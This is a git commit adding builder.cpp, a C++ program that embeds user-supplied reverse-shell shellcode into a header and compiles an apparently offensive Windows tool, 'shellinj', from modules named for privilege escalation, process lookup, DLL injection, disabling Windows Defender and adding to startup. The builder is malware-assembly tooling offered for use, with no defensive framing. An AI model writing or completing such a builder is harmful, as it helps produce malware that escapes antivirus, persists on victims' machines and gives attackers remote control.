0a1ee1ad5f806d6b243013578171baf373df168c
Adam Novikov <adam.petrovich.novikov@gmail.com>
2024-05-01 10:04:16 +0300

    add beta version for builder

---
+++ builder.cpp
@@ -0,0 +1,46 @@
+#include <Windows.h>
+#include <iostream>
+#include <string>
+#include <conio.h>
+#include <fstream>
+
+void write_reverse_shell_2_fileh(std::string shellcode_path) {
+
+	std::remove("shellcode.h");
+	std::ofstream shellfile("shellcode.h");
+	
+    
+	std::ifstream myfile;
+	myfile.open(shellcode_path);
+	std::string myline;
+	if (myfile.is_open()) {
+		while (myfile) { // equivalent to myfile.good()
+			std::getline(myfile, myline);
+			std::cout << myline << '\n';
+			shellfile << myline << '\n';
+		}
+	}
+	else {
+		std::cout << "[-] Couldn't open file\n";
+	}
+
+
+}
+
+
+int main() {
+	std::cout << "welcome to the shellinj_exmple builder\n";
+	std::string shellcode_path;
+	std::cout << "enter file path+name.txt with the shell code shellcode : \n";
+	std::cin >> shellcode_path;
+
+	write_reverse_shell_2_fileh(shellcode_path);
+	std::cout << "[*] writing shell code to shellcode.h\n";
+
+
+	std::cout << "[*]compiling the program...\n";
+	system("g++ shellinj.cpp priv_esc.cpp find_pid.cpp dll_inj.cpp disable_windef.cpp add_to_startup.cpp -o shellinj");
+	getch();
+
+	return 0;
+}
